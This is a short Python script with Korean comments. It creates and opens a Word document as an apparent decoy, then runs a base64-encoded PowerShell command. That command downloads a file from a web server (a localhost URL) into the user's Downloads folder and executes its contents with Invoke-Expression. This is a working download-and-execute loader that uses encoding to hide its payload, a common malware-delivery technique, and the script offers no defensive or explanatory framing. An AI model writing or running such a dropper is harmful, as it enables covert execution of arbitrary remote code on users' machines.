from docx import Document
import os
import shutil
import tempfile

def create_docx(file_name):
    # 임시 디렉토리 생성
    temp_dir = tempfile.gettempdir()

    # 새로운 Document 객체 생성
    doc = Document()

    # 문서에 텍스트 추가
    doc.add_heading('제목', level=1)
    doc.add_paragraph('이 문서는 Python으로 생성되었습니다.')

    # 임시 파일 경로
    temp_file_path = os.path.join(temp_dir, file_name)

    # 문서 저장
    doc.save(temp_file_path)

    print(f"문서가 {temp_file_path}에 성공적으로 생성되었습니다.")

    # 생성된 파일을 %TEMP%로 이동
    dest_file_path = os.path.join(temp_dir, file_name)
    shutil.move(temp_file_path, dest_file_path)

    print(f"문서가 {dest_file_path}로 이동되었습니다.")

    # 생성된 파일 열기
    os.system(f'start {dest_file_path}')

import subprocess
import base64

def run_encoded_powershell_script(encoded_script):
    # PowerShell 실행 명령어
    powershell_cmd = ["powershell", "-EncodedCommand", encoded_script]
    
    # PowerShell 실행
    subprocess.run(powershell_cmd, shell=True)

if __name__ == "__main__":
    file_name = "python.docx"  # 파일 이름 설정
    create_docx(file_name)
    
    # 실행할 PowerShell 스크립트
    powershell_script = """
    $url = "http://127.0.0.1:8000/abc.txt"
    $file = "$env:USERPROFILE\\Downloads\\file.txt"
    Start-BitsTransfer -Source $url -Destination $file
    Invoke-Expression -Command (Get-Content -Path $file -Raw)
    """

    # PowerShell 스크립트를 Base64로 인코딩
    encoded_script = base64.b64encode(powershell_script.encode('utf-16le')).decode('utf-8')

    # 인코딩된 PowerShell 스크립트 실행
    run_encoded_powershell_script(encoded_script)
